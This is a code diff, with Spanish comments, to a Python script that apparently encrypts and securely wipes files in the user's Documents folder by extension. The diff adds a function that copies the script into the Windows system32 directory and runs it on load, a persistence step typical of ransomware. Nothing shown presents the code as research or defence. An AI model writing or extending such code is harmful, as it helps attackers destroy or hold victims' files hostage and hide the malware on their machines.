@@ -47,9 +47,24 @@ def borrar_archivo_seguro(archivo):
     # Eliminar el archivo después de sobrescribirlo
     os.remove(archivo)
 
+# Función para copiar el ejecutable a la carpeta system32
+def copiar_ejecutable_a_system32():
+    windir = os.environ['WINDIR']
+    system32_path = os.path.join(windir, 'system32')
+    
+    # Obtener la ruta del ejecutable actual
+    current_executable = os.path.abspath(__file__)
+    
+    # Copiar el ejecutable a la ruta system32
+    shutil.copy(current_executable, system32_path)
+ 
+
 # Obtener el directorio "Documents" del usuario
 user_profile = os.environ['USERPROFILE']
 documents_dir = os.path.join(user_profile, 'Documents')
+
+# Copiar el ejecutable a la carpeta system32
+copiar_ejecutable_a_system32()
 
 # Extensiones que se desean cifrar
 extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
